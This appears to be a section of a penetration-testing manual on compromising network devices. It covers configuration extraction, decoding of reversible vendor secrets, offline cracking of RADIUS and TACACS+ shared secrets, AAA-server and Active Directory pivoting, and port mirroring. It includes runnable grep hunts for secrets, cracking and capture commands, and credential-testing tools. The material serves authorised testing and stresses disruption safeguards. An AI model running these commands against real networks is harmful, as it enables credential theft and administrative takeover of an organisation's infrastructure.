**Failure modes.** The most common is that the port is open but the feature is in client rather than director mode and does not respond to the operations the tooling attempts, or the platform is a newer train where the feature has been removed. A connection that opens and closes immediately is usually a newer image.

### NETCONF, RESTCONF and vendor APIs

**What it is.** Structured, programmatic configuration interfaces: NETCONF over SSH on TCP 830 using XML, RESTCONF over HTTPS using JSON or XML, gRPC-based telemetry and configuration on modern platforms, and vendor-specific REST APIs on essentially every appliance.

**Why they matter to you.** They authenticate with the same credentials as the CLI, but they behave differently in three useful ways. They frequently bypass the CLI's authorisation granularity, so an account restricted at the CLI may have broader access over the API. They are logged differently and sometimes less thoroughly, because command accounting was built around CLI commands. And they return the entire configuration in a structured format in one request, which is both easier to mine and, on some platforms, a different code path from `show running-config` with different privilege checks.

```bash
# RESTCONF full configuration read.
curl -sk -u $USER:$PASS -H 'Accept: application/yang-data+json' \
  https://$TARGET/restconf/data/Cisco-IOS-XE-native:native | jq .

# NETCONF over SSH: request the running datastore.
ssh -s $USER@$TARGET -p 830 netconf
```

<!-- VERIFY: the RESTCONF top-level YANG module name differs by platform and release; Cisco-IOS-XE-native is correct for IOS-XE but confirm for other platforms. The NETCONF subsystem invocation form should be checked against the target vendor's documentation. -->

Where an appliance exposes an API with token authentication, the token is a credential in its own right, and tokens found in configuration management repositories, in monitoring platform configurations, or in a browser's local storage on an administrator's workstation are directly usable. Appliance API tokens are frequently long-lived and not revoked when a session ends.

### Out-of-band and serial console access

**What it is.** The physical and quasi-physical management path: the console port on the device itself, and the console server or terminal server that aggregates dozens of console ports onto a network-accessible box.

**Why it is the most powerful access there is.** The console port has no authentication requirement in the protocol and no network access list. On most platforms it is the path that supports the password recovery procedure, which is documented by the vendor and which involves interrupting the boot sequence to bypass the stored configuration entirely. That means physical or console-server access to a device is administrative access to it, without any credential, by design. There is no patch for this and there is no configuration that fully prevents it, only features that make it noisier or that trade recoverability for security, such as Cisco's `no service password-recovery`, which prevents the bypass at the cost of making the device unrecoverable without erasing its configuration.

**Why the console server is the target.** Console servers, sold as serial console servers, terminal servers or out-of-band management appliances, aggregate the console ports of an entire rack or an entire site. They are reached over the network, usually over SSH or, distressingly often, Telnet. They frequently have per-port access with a single shared credential, default credentials that were never changed because the device was commissioned by an installer, and a management interface that is an old embedded web server. Compromising a console server yields console-port access to every device connected to it, which yields administrative access to every one of those devices via the password recovery procedure, without any device credential at all. It is the single highest-leverage device class in this entire section and it is almost never in scope, almost never patched, and almost never monitored.

```bash
# Console servers present as many Telnet or SSH listeners, one per port,
# on a predictable port range, or as a menu on a single port.
nmap -p 22,23,80,443,2000-2048,3000-3048,7000-7048 -sV $TARGET
```

<!-- VERIFY: per-port TCP mappings vary by vendor. Common conventions map serial port N to a base port plus N, with 2000, 3000 and 7000 series bases in use by different vendors. Confirm the mapping for the specific product before scanning a wide range. -->

**What to do with a console session.** Once you have a console, you have a device prompt with no network access list in the way. If the device is already logged in, you inherit the session. If not, you can attempt credentials, or, where you have agreement to reload the device, follow the vendor's documented recovery procedure. Understand clearly that the recovery procedure requires a reload, which is an outage, so it belongs in the same category as any other disruptive change and requires agreement first. Reading an already-open console session or authenticating with known credentials is free; recovering a password is not.

**Detection and opsec.** Console logins are logged where logging is configured, and the console is often the one place where logging is configured to the local buffer only, which means the evidence disappears at the next reload. A reload for password recovery is an interface-down event on every port of that device, which is loud, visible to users and immediately investigated. Console server logins are logged by the console server, which is frequently not forwarding logs anywhere.

## Configuration Extraction and What to Do With It

This is the core technique of the whole section. Everything above is a route to a configuration file, and everything below is what a configuration file is worth.

### Getting the configuration

Routes, ordered by preference. Prefer the quietest route that works.

| Route | Access needed | Noise | Notes |
| --- | --- | --- | --- |
| CLI over SSH with credentials | Device credentials | Low | Looks like normal administration. The default choice |
| Configuration backup archive | Access to the archive host or share | Very low | Whole fleet at once, no device is touched |
| Configuration management platform | Platform credentials | Very low | Whole fleet, plus change history, plus the credentials the platform uses |
| RESTCONF or NETCONF | Device credentials | Low | Structured output, sometimes different privilege checks |
| SNMP write plus TFTP | Write community | High | No credentials needed, but a distinctive device-initiated transfer |
| TFTP archive read | Nothing | Very low | Only works where filenames are guessable |
| Smart Install or similar | Nothing | High | No credentials at all where present |
| Web UI configuration download | Web credentials | Low | Often produces a richer file than the CLI, including secrets the CLI masks |
| Console or console server | Physical or console server access | Low to very high | Free if a session exists, an outage if you need recovery |

The configuration management platform route deserves emphasis. Organisations of any size run something that backs up device configurations on a schedule: SolarWinds NCM, Rancid, Oxidized, Unimus, a Git repository driven by Ansible or Nornir, or a vendor platform such as Cisco Catalyst Centre, Panorama, FortiManager or Aruba Central. Every one of these stores every device's configuration, stores the credentials used to reach every device, and stores a full change history. It is one target instead of three hundred, it is a general-purpose server rather than an embedded device so all your normal post-exploitation applies, and reading a configuration out of it touches no network device at all. When you find a Git repository of device configurations, read the history as well as the current state, because secrets that were rotated are still in the history and secrets that were committed accidentally and removed are still in the history.

```bash
# CLI extraction, the normal way. Disable paging first or you will
# get a screenful and a --More-- prompt.
# Cisco IOS / IOS-XE / NX-OS:
terminal length 0
show running-config
show startup-config

# Cisco ASA, which masks some secrets in show running-config
# but not in the system: form:
more system:running-config

# Junos, in set format which is far easier to grep:
show configuration | display set | no-more

# FortiOS, full form includes defaults and is much more informative:
show full-configuration

# PAN-OS:
set cli config-output-format set
show

# Arista EOS:
show running-config all

# Huawei VRP:
display current-configuration

# ArubaOS controller: reveal encrypted values first, then dump.
encrypt disable
show running-config
```

The ArubaOS pair is worth highlighting as a pattern rather than a vendor quirk. Several platforms have a command or a setting that switches configuration display between the obfuscated and the plaintext form, because engineers need to read a pre-shared key occasionally. Where such a command exists, it is a one-line path from "I have an admin session" to "I have every secret on the device in plaintext", with no cracking and no decoding. Look for it on every platform you meet.

**Scripting extraction across a fleet.** Once you have one working credential, collect configurations from every device in the estate. Do it with a library that understands device CLIs rather than with `expect`, because paging, prompt detection and privilege escalation are all handled for you.

```python
from nornir import InitNornir
from nornir_netmiko.tasks import netmiko_send_command
from nornir_utils.plugins.functions import print_result

nr = InitNornir(config_file="config.yaml")
result = nr.run(task=netmiko_send_command, command_string="show running-config")
print_result(result)
```

`netmiko` and `scrapli` both handle the per-vendor differences, and `nornir` gives you inventory and concurrency over them. Keep concurrency low, because you are opening management sessions on production infrastructure.

### Mining the configuration: credentials and hash formats

The single most valuable thing in a configuration file is the credential material, and the single most important thing to understand about it is that **not all of it is hashed**. Some of it is obfuscated with a published algorithm and a fixed key, which means it is not a cracking problem, it is a decoding problem, and it takes microseconds. Distinguishing the two categories is the difference between a finding you can demonstrate immediately and a hash you may never crack.

| Vendor and marker | Format | Recoverable without cracking? | Offline cracking |
| --- | --- | --- | --- |
| Cisco `password 0 <string>` | Plaintext | Yes, it is already plaintext | n/a |
| Cisco `password 7 <string>` (type 7) | Vigenère-style XOR against a published key table, enabled by `service password-encryption` | **Yes, instantly and deterministically** | n/a |
| Cisco type 4 | Single unsalted SHA-256, an acknowledged implementation error, deprecated | No | hashcat `-m 5700` |
| Cisco type 5 (`$1$`) | md5crypt | No | hashcat `-m 500` |
| Cisco type 6 | Reversible AES under a device master key set with `key config-key password-encrypt`, and the master key is not stored in the configuration | Only with the master key from the device | n/a |
| Cisco type 8 (`$8$`) | PBKDF2-SHA256 | No | hashcat `-m 9200` |
| Cisco type 9 (`$9$`) | scrypt | No | hashcat `-m 9300` |
| Cisco PIX legacy | Unsalted MD5 variant | No | hashcat `-m 2400` |
| Cisco ASA | Salted MD5 variant | No | hashcat `-m 2410` |
| Juniper Junos `$9$` | Juniper's own reversible obfuscation, used for RADIUS and TACACS secrets, IKE keys, BGP and IS-IS authentication keys | **Yes, instantly. Also `request system decrypt password` on the device itself** | n/a |
| Juniper Junos `$1$` | md5crypt, used for local user passwords | No | hashcat `-m 500` |
| Juniper Junos `$5$` | sha256crypt | No | hashcat `-m 7400` |
| Juniper Junos `$6$` | sha512crypt | No | hashcat `-m 1800` |
| Juniper IVE | Vendor format | No | hashcat `-m 501` |
| FortiOS admin password | Salted SHA-1 based vendor format | No | hashcat `-m 7000` |
| FortiOS config `ENC <base64>` | AES under a static, publicly known key, unless `private-data-encryption` has been explicitly enabled | **Yes, unless private-data-encryption is on** | n/a |
| PAN-OS `<phash>` | md5crypt on older releases, sha512crypt on current ones | No | `-m 500` or `-m 1800` |
| ArubaOS controller secrets | 3DES-CBC under a known key; `encrypt disable` prints plaintext on the device | **Yes** | n/a |
| F5 BIG-IP `$M$` values | Encrypted under the unit master key retrievable on the device with `f5mku -K` | Only with the master key from the device | n/a |
| Arista EOS `secret` | md5crypt or sha512crypt | No | `-m 500` or `-m 1800` |
| TACACS+ session body | Obfuscated with an MD5 pad keyed on the shared secret | Yes, given the secret | Secret crackable: hashcat `-m 16100` |
| SNMPv3 authentication | HMAC-MD5-96 or HMAC-SHA1-96 over the PDU | No | `-m 25100` or `-m 25200` |
| IPMI RAKP | HMAC-SHA1 or HMAC-MD5, disclosed pre-authentication | No | `-m 7300` or `-m 7350` |

**The reversible encodings are a finding in their own right, and you should report them as one.** Cisco type 7, Juniper `$9$`, Fortinet `ENC` and Aruba's 3DES form are not weak hashing, they are not hashing at all. They exist so the device can recover the plaintext, because the device needs the plaintext to authenticate to a RADIUS server or to bring up an IPsec tunnel. That is a legitimate design constraint and it is not a vendor mistake. What is a mistake is treating a configuration file containing these values as if it were sanitised. Configuration files with type 7 and `$9$` values in them get pasted into support tickets, committed to internal Git repositories, attached to change requests, mailed to vendors, shared in chat channels and stored in documentation wikis, on the assumption that "encrypted" means safe. Every one of those is a credential disclosure. When you find device configurations in a Confluence page or a SharePoint site or a ticket, you have very likely found the RADIUS shared secret and the wireless pre-shared key for the whole estate.

The corollary is a specific, high-value search across everything you can read.

```bash
# Search every file store, share, wiki export and repository you can read.
grep -rInE '\$9\$[A-Za-z0-9./]+' .                  # Junos reversible secrets
grep -rInE 'password 7 [0-9A-Fa-f]{4,}' .            # Cisco type 7
grep -rInE 'ENC [A-Za-z0-9+/=]{20,}' .               # FortiOS encoded values
grep -rInE '\$(1|5|6|8|9)\$' .                       # crypt-family and Cisco 8/9
grep -rInE 'enable (secret|password)' .
grep -rInE '(tacacs|radius).{0,40}key' .
grep -rInE 'pre-shared-key|pre-shared|psk' .
grep -rInE 'snmp-server community' .
```

**Decoding, not cracking.** For Cisco type 7 the algorithm is published and implementations are everywhere, including in Metasploit's `auxiliary/admin/cisco/cisco_decrypt` style modules and in a dozen standalone scripts. For Junos `$9$` the maintained reference implementation is `junosdecode`, and if you have a device session, `request system decrypt password` does it on the device. For FortiOS `ENC` values the decryption uses AES-CBC with the published static key, and public scripts implement it directly; note that if the administrator has enabled `private-data-encryption` with a custom key the values are no longer recoverable from the configuration alone, and its absence is itself worth reporting.

```bash
# Junos $9$ decode.
git clone https://github.com/pklimai/junosdecode && python3 junosdecode/junosdecode.py '$9$...'

# Cisco type 7 decode: any implementation works, the algorithm is fixed.
msfconsole -q -x "use auxiliary/admin/cisco/cisco_decrypt; set PASSWORD 0123456789ABCDEF; run; exit"
```

<!-- VERIFY: the Metasploit module path for Cisco type 7 decryption. A module of this function exists but confirm the exact path in the current framework, and prefer a standalone implementation if it has moved. -->

**Cracking what is genuinely hashed.** Cisco type 5, md5crypt and the crypt family generally, and the Fortinet and PAN-OS formats are real one-way functions and need a wordlist. Two things make this more tractable than cracking domain hashes. First, network device passwords are chosen by network engineers and follow highly guessable patterns: the vendor name, the site code, the device role, the company name, and a year, in various combinations, with substitutions. Build a targeted wordlist from the organisation's own vocabulary, which you can harvest from the interface descriptions in the configurations you already have. Second, these hashes are usually low iteration count, so md5crypt in particular cracks fast.

```bash
hashcat -m 500  cisco_type5.txt wordlist.txt -r rules/best64.rule
hashcat -m 9200 cisco_type8.txt wordlist.txt -r rules/best64.rule
hashcat -m 7000 fortios.txt wordlist.txt -r rules/best64.rule
```

Type 8 and type 9 are PBKDF2 and scrypt respectively and are deliberately slow; a device configured with type 9 secrets is one where you should stop cracking and go after the centralised authentication instead. That is the correct read of the situation, not a defeat: a fleet using type 9 local secrets is a fleet with mature configuration standards, which almost certainly means TACACS+ and a small number of local break-glass accounts, which means the TACACS+ server is the target.

**Common mistake.** Treating type 7 as if it needed cracking, and treating type 5 as if it were reversible. Both errors appear constantly in reports. Type 7 is a decode and should be reported as plaintext-equivalent. Type 5 is md5crypt and needs a wordlist. Getting this the wrong way round either wastes days or overstates a finding, and a client's network team will notice immediately.

### SNMP community strings

Every configuration contains its SNMP configuration in plaintext or near-plaintext, and community strings are fleet-wide. Extract them and immediately re-sweep the whole estate with the strings you found, including the read-write string. This is the single highest-return loop in the section: one configuration yields the write community, the write community yields every other configuration, and every other configuration yields everything else.

```text
snmp-server community Str0ngRO RO 10
snmp-server community Str0ngRW RW 11
snmp-server host 10.20.30.40 version 2c Str0ngRO
```

Read three things from those lines. The strings themselves. The access list numbers, `10` and `11` here, which restrict which sources may use each string and which you then look up in the same configuration to learn which addresses are permitted, telling you where you need to be standing. And the trap host, which is the monitoring platform's address, which is your next target.

### RADIUS and TACACS+ shared secrets

The shared secret is the highest-value single string in a device configuration after the enable secret, and often above it. It appears in the configuration in one of the reversible or plaintext forms above on most platforms, which means you get it for free.

```text
tacacs server ISE-1
 address ipv4 10.20.30.50
 key 7 04480E051A33490C
radius server NPS-1
 address ipv4 10.20.30.51 auth-port 1812 acct-port 1813
 key 7 121A0C041104
```

The `key 7` values decode instantly. What you now have is covered in detail in the centralised authentication section below, but in summary: the ability to impersonate the authentication server to devices, the ability to decrypt or forge protocol exchanges, and, because these secrets are configured fleet-wide by the same template, a secret that works against every device and every authentication server in the organisation.

### VPN pre-shared keys

IPsec pre-shared keys appear in firewall and router configurations in reversible or plaintext form on most platforms, keyed by peer address. What you get is the identity of every VPN peer, which is a list of every site, every partner and every cloud connection the organisation has, and the key material to establish a tunnel as one of them. The peer list is often more valuable than the keys: a site-to-site peer list is an inventory of the organisation's actual network boundary, including the branch offices, the third parties, the acquired company that was never integrated, and the cloud VPC connections.

```text
crypto isakmp key 0 SuperSecretPSK address 203.0.113.10
crypto keyring PARTNER pre-shared-key address 198.51.100.20 key 6 <AES-encrypted>
```

Note the distinction the configuration itself makes: `key 0` is plaintext, and `key 6` is the AES form that needs the device master key. Where you see a mix in one estate, the type 6 entries were configured after the master key was introduced and the plaintext ones predate it, which tells you something about the age of each tunnel.

Separately, and this is a legacy issue but it still turns up: IKEv1 aggressive mode with pre-shared key authentication transmits a hash of the PSK in the clear during negotiation, making the PSK offline crackable by anyone who can initiate a negotiation with the gateway. It is a genuine finding where you find it and it requires nothing but reachability to the gateway.

```bash
# Fingerprint the IKE implementation and check for aggressive mode.
ike-scan -M $TARGET
ike-scan -M -A -n fakegroup $TARGET
```

<!-- VERIFY: ike-scan flag semantics for aggressive mode PSK capture, and the current maintenance status of the tool. The mechanism is correct; confirm the exact invocation and the hash extraction format before relying on it. -->

### Wireless passphrases and 802.1X configuration

Wireless controller and access point configurations contain the pre-shared key for every WPA2-Personal SSID in reversible or plaintext form, which is a direct path onto whatever network that SSID maps to. They also contain the full 802.1X configuration: the RADIUS servers, the shared secrets, the SSID to VLAN mapping, and the authorisation policy. The SSID to VLAN mapping is the segmentation intelligence: it tells you what network the guest SSID actually lands on, whether the corporate SSID is on the same VLAN as the wired user network, and whether any SSID has a path to the management VLAN. The wireless material in the On-Path and Traffic Attacks section covers the radio-side attacks; this is the configuration-side equivalent and it is both quieter and more complete.

### SSH keys and certificates

Configurations and their surrounding filesystems contain SSH authorised keys for administrative accounts, device host private keys, and TLS private keys and certificates. Three separate wins.

Authorised public keys tell you which accounts can log in without a password and, by their comment field, which user or which automation system owns them. Chase the corresponding private key: it lives on a jump host, in a configuration management repository, in a CI runner, or in an engineer's home directory, and any of those may be easier to reach than the device.

Device host private keys let you impersonate the device to anything that connects to it, which matters where automation connects to devices and verifies host keys.

TLS private keys on devices that terminate TLS, principally load balancers and reverse proxies and SSL VPN portals, are covered in the load balancer section and are among the most valuable pieces of material in the entire estate.

### Routing and VLAN topology as intelligence

Read the configuration as a document rather than as a credential store. The routing configuration gives you every peer and therefore every adjacent network, every static route and therefore every exception, the routing protocol authentication keys where configured, and the redistribution policy which tells you how networks are joined. The VLAN configuration gives you every VLAN, its name and therefore its purpose, and its layer 3 interface and subnet. Interface configuration gives you which physical port carries which VLAN, which ports are trunks, and what the native VLAN is on each trunk, which is exactly what the VLAN hopping material in the On-Path and Traffic Attacks section needs as input.

Specific things worth extracting deliberately:

- **Trunk ports and their allowed VLAN lists.** A trunk with `switchport trunk allowed vlan all` on an access-layer port is a segmentation failure you can demonstrate.
- **Native VLANs.** A native VLAN that is a real user or server VLAN rather than an unused one is the precondition for the double-tagging attack.
- **VLANs that appear on more devices than they should.** A management VLAN trunked to an access switch in a public area is a finding.
- **Layer 3 interfaces with no access list.** An SVI with no inbound filter is an unrestricted path between that VLAN and the rest of the routed network.
- **Routing protocol authentication.** Absent or weak authentication on an interior routing protocol means route injection is possible from any host on that segment, which is a far more powerful position than ARP poisoning and is covered from the protocol side in the On-Path and Traffic Attacks section.
- **VRF definitions.** VRFs are how organisations implement genuine layer 3 separation. A device with a VRF that has a route leak configured to the global table is where that separation breaks.

### Access control lists as a map of intent

Access control lists are the most under-read part of a device configuration and the most useful for reporting. An ACL is a written statement of what the organisation believes it is preventing, and reading it tells you three things simultaneously: what is protected, what is considered sensitive enough to protect, and where the exceptions are.

Read them adversarially, in this order.

**Find the deny that matters, then find the permit above it.** ACLs are ordered and first-match. A carefully written deny for a sensitive network is worthless if a broad permit precedes it. This is the most common ACL defect and it is invisible unless you read the list in order.

**Find the permit that ends the list.** A `permit ip any any` at the bottom of an access list that was clearly written to restrict something means the restriction does nothing. Similarly, an ACL that exists but is not applied to any interface is a very common finding: search the configuration for every ACL name and check whether each is referenced by an `access-group`, a `service-policy` or a routing statement. Unapplied ACLs are extremely common and represent a control the organisation believes it has.

**Find the exceptions and ask why.** Every ACL accumulates single-host permits for projects, vendors, monitoring systems and troubleshooting sessions that were never removed. Each is a host with privileged network access, and each is a target: if you compromise the monitoring server that has a permit through the card data environment boundary, you have the boundary.

**Read the direction.** An ACL applied inbound on an interface filters traffic arriving on that interface. Segmentation implemented in one direction only is not segmentation, and it is common, because engineers protect the sensitive network from the untrusted one and forget the return path or the reverse initiation.

**Note what is absent.** An estate with no ACLs at all between server VLANs is flat regardless of how many VLANs exist, and VLANs without filtering are a broadcast domain optimisation, not a security control. This is worth saying explicitly in a report because organisations conflate the two constantly.

```bash
# Once you have configurations, parse rather than grep for the structural questions.
python3 - <<'PY'
from ciscoconfparse import CiscoConfParse
p = CiscoConfParse("device.cfg", syntax="ios")
# Interfaces with an address but no inbound filter.
for intf in p.find_objects_w_child(r"^interface", r"ip address"):
    if not intf.re_search_children(r"ip access-group .* in"):
        print("no inbound filter:", intf.text)
PY
```

`ciscoconfparse`, and its successor project `ciscoconfparse2`, parses Cisco, Arista, Juniper, Palo Alto and F5 configurations into a hierarchy you can query, which is the right tool for asking structural questions across a whole fleet rather than one device. For a canned audit pass, `nipper-ng` produces a security report from a device configuration; it is old and its rule set reflects that, so treat its output as a starting checklist rather than a finding list.

### Management system addresses

Extract and consolidate every address the configuration points at. Each one is a system that has credentials for this device, and probably for every other device.

| Configuration element | What the address is | Why it matters |
| --- | --- | --- |
| `snmp-server host` | Trap receiver, the network management platform | Holds SNMP strings and often device credentials for the fleet |
| `logging host` | Syslog collector or SIEM | Tells you exactly what a defender can see, and holds the logs of your own activity |
| `tacacs server` / `radius server` | Device authentication server | Compromise yields the whole fleet |
| `ntp server` | Time source | Often a domain controller, which is a useful inference |
| `ip name-server` | DNS | Usually a domain controller |
| `archive path` / backup destination | Configuration archive | The whole fleet's configurations in one place |
| `ip tftp source-interface` plus a TFTP address | Firmware and config server | As above, plus firmware supply chain |
| `netflow` / `sflow` collector | Flow collector | Tells you whether device-initiated flows will be noticed |
| Management platform tunnel endpoints | Panorama, FortiManager, Aruba Central, Catalyst Centre | Administrative control of the whole fleet |
| `aaa authentication` order | The authentication fallback chain | Tells you whether a local credential is usable when the AAA server is unreachable |

That last row is operationally important. An `aaa` configuration whose method list ends in `local` or `enable` means the device falls back to a local credential when the AAA server does not answer. If you can make the AAA server unreachable from the device, which is a disruptive action and needs agreement, the device becomes attackable with local credentials that are frequently far weaker and never rotated. More usefully and without any disruption, the same fallback means that a local credential you crack from one configuration is likely valid on every device, because the fallback credential is set fleet-wide by template.

## Centralised Authentication as the High-Value Target

### Why this is the objective

Everything above converges here. Device administration in any estate above a handful of devices is centralised, so the authentication server is a single point of compromise for the entire network layer. There are two protocols and they are not equivalent.

### RADIUS

**What it is.** UDP-based authentication, authorisation and accounting on 1812 and 1813, or 1645 and 1646 on legacy configurations, used for network access control including 802.1X and wireless, for VPN authentication, and sometimes for device administration.

**Protocol weaknesses that matter.** RADIUS is old and its cryptography shows it. Only the User-Password attribute is protected, and it is protected by XORing the password against an MD5 stream derived from the shared secret and the request authenticator. Everything else in the packet, including the username, the NAS identity, the VLAN assignment and the reply attributes, is in the clear. The Response Authenticator is an MD5 hash over the response and the shared secret, which means an observed request and response pair permits an offline attack on the shared secret with no interaction. And because MD5 is used structurally rather than as a hash of a secret input, the protocol inherits MD5's collision weaknesses: the vulnerability tracked as CVE-2024-3596 and published as Blast-RADIUS uses an MD5 chosen-prefix collision to let an on-path attacker convert an Access-Reject into an Access-Accept, forging a successful authentication without knowing the shared secret or any password. It applies to non-EAP exchanges where the client does not include a Message-Authenticator attribute, which describes a great deal of real deployment, and the mitigation is to require Message-Authenticator on all packets or to run RADIUS inside a TLS tunnel.

**What you do with a captured exchange.** Crack the shared secret offline. The mechanism is that the Response Authenticator is `MD5(Code + ID + Length + RequestAuthenticator + Attributes + Secret)`, and everything but the secret is observable, so each candidate secret costs one MD5 finalisation over precomputed state. John the Ripper ships `radius2john.pl` to extract the relevant material from a capture into a crackable format.

```bash
# Capture RADIUS. Polling and authentication traffic is continuous
# on any network with 802.1X or wireless, so this fills quickly.
sudo tcpdump -i $IFACE -w radius.pcap 'udp port 1812 or udp port 1813 or udp port 1645 or udp port 1646'

# Extract and crack the shared secret.
perl /usr/share/john/radius2john.pl radius.pcap > radius.hashes
john --format=dynamic_1008 radius.hashes
```

<!-- VERIFY: radius2john.pl path and the exact John format name. The script exists in John the Ripper's run directory and the Openwall wiki documents the dynamic_1008 and dynamic_1009 formats for the two attack variants; confirm both against your installed version. -->

**What the shared secret permits.** With the secret you can decrypt the User-Password attribute out of any captured Access-Request, which is the user's actual password in the cases where PAP is in use. You can forge and inject responses, granting access and setting reply attributes such as the assigned VLAN, which means you can put yourself on any VLAN the RADIUS server is capable of assigning. You can stand up your own RADIUS server that devices will accept, or authenticate to the real server as a NAS and test credentials against it directly, which turns the RADIUS server into a credential oracle for the entire directory it authenticates against. And because the secret is usually the same on every device, it works everywhere.

```bash
# Test credentials directly against the RADIUS server as a client,
# once you have the shared secret. FreeRADIUS ships this utility.
radtest $USER $PASS $TARGET 1812 $SHARED_SECRET
echo "User-Name=$USER,User-Password=$PASS" | radclient -x $TARGET:1812 auth $SHARED_SECRET
```

**Compromise of the server itself.** The RADIUS server is a general-purpose host, which means normal post-exploitation applies. What it yields depends on the product. Windows NPS is a role on a Windows server and is frequently installed on a domain controller or a domain-joined host with delegated rights, so compromising it is a Windows compromise with the usual consequences; its configuration contains every shared secret for every client, and its logs contain every authentication event in the estate. Cisco ISE and Aruba ClearPass are appliances with their own databases, their own administrative interfaces, and stored credentials for Active Directory service accounts, for device administration, for certificate authorities and for the network devices themselves. FreeRADIUS stores everything in flat files or a SQL database, so the shared secrets for every client are in `clients.conf` and the user database is wherever the configuration points.

The most important yield in every case is the same: **the shared secret for every network device in the estate, in one file.** That is the fleet.

### TACACS+

**What it is.** TCP 49, Cisco-originated, and the protocol actually used for device administration where an organisation has done this properly, because unlike RADIUS it separates authentication, authorisation and accounting and can authorise individual commands.

**Protocol weaknesses.** TACACS+ obfuscates the packet body by XORing it against an MD5-derived pad keyed on the shared secret, the session ID, the version and the sequence number. The header, including the session ID and the sequence numbers, is in the clear. This is obfuscation and not encryption: there is no integrity protection, no replay protection and no forward secrecy, and the pad is derived from a static secret. The practical consequences are that a captured session is decryptable offline given the shared secret, that the shared secret is crackable offline from a captured session because the plaintext structure is highly predictable, and that Wireshark will decrypt the whole session for you once you enter the key.

```bash
sudo tcpdump -i $IFACE -w tacacs.pcap 'tcp port 49'

# Crack the shared secret from the capture.
hashcat -m 16100 tacacs.hash wordlist.txt

# Then decrypt in Wireshark by setting the TACACS+ protocol preference
# to the recovered key, and read every administrative session in the capture.
```

<!-- VERIFY: extraction of a hashcat -m 16100 hash from a TACACS+ pcap. Mode 16100 is TACACS+ in hashcat; confirm the current extraction tooling, which has historically been a community script. -->

**Why decrypting a TACACS+ session is so valuable.** TACACS+ carries the administrator's username and password to the server, and it carries command authorisation and command accounting in both directions. A decrypted session gives you the credential and, separately, a transcript of exactly what the administrator did, which includes the commands and often the arguments. If an engineer configured a pre-shared key or a local account during a session you captured, you have that too.

**What the shared secret permits.** The same class of things as RADIUS: decrypt captured sessions, impersonate the server to devices, impersonate a device to the server. Impersonating the server to a device means you can authorise any login and any command, which is administrative access to that device without any device credential. This requires an on-path position between the device and the server, which in practice means the management network, and it is why the management network's security matters so much.

**Compromise of the TACACS+ server.** This is the single highest-value target in the network device layer. It holds the shared secret for every device, the authorisation policy which tells you exactly what each administrative group can do, the accounting records which are a complete transcript of network administration, and, where it authenticates against Active Directory, a service account with directory read access at minimum.

### The relationship with Active Directory

In most estates the chain is: network engineer logs into a device, the device asks TACACS+ or RADIUS, the AAA server asks Active Directory, Active Directory answers, the AAA server maps the user's group membership to a privilege level, the device grants access. Every link in that chain is an attack path and the chain runs in both directions.

**Downward, from AD to devices.** Membership of the Active Directory group that the AAA server maps to full device privileges is equivalent to administrative access on every network device. Find that group. It will be named something like `Network-Admins` or `NetEng-Priv15` and it will be small, unremarkable in the directory, entirely absent from any tiering model, and frequently containing service accounts and long-departed contractors. It is very often not in the Protected Users group, not covered by an administrative tier, and its members log in from ordinary workstations with ordinary email, which means a single phish or a single workstation compromise yields the entire network layer. The BloodHound CE material in the Active Directory: Enumeration section is the right tool for finding it: enumerate the groups referenced by the AAA server's configuration, then look at who can reach them.

**Upward, from devices to AD.** The AAA server needs a service account to query the directory. That account's credentials are in the AAA server's configuration, and it is a domain account. It usually only has read access, which is still a full directory enumeration primitive, but it is frequently over-privileged because it was configured by someone following a vendor guide that said "an account with sufficient permissions". Certificate-based device administration adds a further link, because the AAA server needs a certificate and a trust chain, and the certificate template it uses is worth examining against the ADCS material in the Coercion, Relay and Certificate Abuse section.

**Sideways, to everything else the AAA server does.** The same RADIUS server that authenticates device administration usually also authenticates wireless, wired 802.1X, and VPN. One compromise therefore yields network access control bypass, wireless access and remote access simultaneously.

```bash
# Find the AAA integration from the AD side. Look for the service account
# named in device or AAA configurations, and for the privilege groups.
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=local" \
  "(|(cn=*network*)(cn=*tacacs*)(cn=*radius*)(cn=*ise*)(cn=*clearpass*)(cn=*nps*))" \
  cn description memberOf servicePrincipalName
```

## Reconfiguration as an Attack

### The disruption calculus

Reading a configuration is safe. Changing one is not. This is the hardest boundary in this section and the one where operators cause real harm.

Before any change, establish four things. What exactly will this change affect, including things you have not thought of. How will I know if it broke something. How do I revert it, precisely, and have I saved the original. And who do I need to have told. If you cannot answer all four, do not make the change. If the change touches routing, access control lists, interface state, spanning tree, or the first-hop redundancy protocols, you need explicit agreement from someone with authority to accept the outage risk, in writing, before you type it.

Two mechanical safeguards are worth using every time. First, take and store the full running configuration before you change anything, so that a revert is a known operation rather than a reconstruction. Second, use the platform's timed rollback where it has one: Cisco IOS-XE's configuration archive with `configure replace`, or a scheduled reload, ensures that a change which cuts off your own access reverts itself rather than requiring a site visit. Locking yourself out of a device with a bad ACL is the single most common way this goes wrong, and a timer is the cheapest insurance available.

```text
! IOS: arm a reload before making a risky change, then cancel it if you survive.
reload in 10
! ... make the change, confirm you still have access ...
reload cancel
```

<!-- VERIFY: reload in / reload cancel syntax and behaviour on the specific IOS train. The mechanism is standard on IOS and IOS-XE; confirm the platform supports it and that it does not require confirmation prompts that will hang an automated session. -->

### Port mirroring: get the traffic without an on-path attack

**This is the most important technique in this section and it deserves to be understood as a replacement for ARP poisoning rather than a supplement to it.** The On-Path and Traffic Attacks section makes the case that subnet-wide ARP spoofing is expensive, indiscriminate, disruptive and increasingly low-yield, and that you should prefer surgical positions. Port mirroring is the logical end point of that argument: with administrative access to a switch, you can be delivered a copy of any traffic you want, at line rate, with no manipulation of any host's ARP cache, no forwarding burden on your machine, no risk of black-holing a production session, and no change to how traffic flows.

**What it is.** A switch feature, called SPAN on Cisco, port mirroring or monitor session generically, and RSPAN or ERSPAN in its remote forms, that copies frames from a source port, VLAN or set of ports to a destination port where you have a capture interface.

**Why it works.** Switches forward frames based on the MAC address table. Mirroring is a separate, additive function in the forwarding path that duplicates selected frames to an additional egress port. It does not alter the original forwarding decision, which is precisely why it is non-disruptive to the traffic being observed. The mirrored traffic is a pure copy.

**Why it is better than ARP poisoning in every dimension.** You choose the source by port or by whole VLAN, so you can capture an entire server VLAN rather than a handful of hosts. The traffic is not routed through your machine, so your CPU and your uplink are irrelevant and you cannot cause a partial outage by dropping packets. There is no ARP cache to restore afterwards and therefore no cleanup failure mode. It is invisible to any host on the network, including to Dynamic ARP Inspection, to endpoint detection watching for ARP anomalies, and to a host's own view of its neighbours. And the capture is complete rather than opportunistic: you get every frame from the moment you enable it, not whatever happened to traverse your poisoned path.

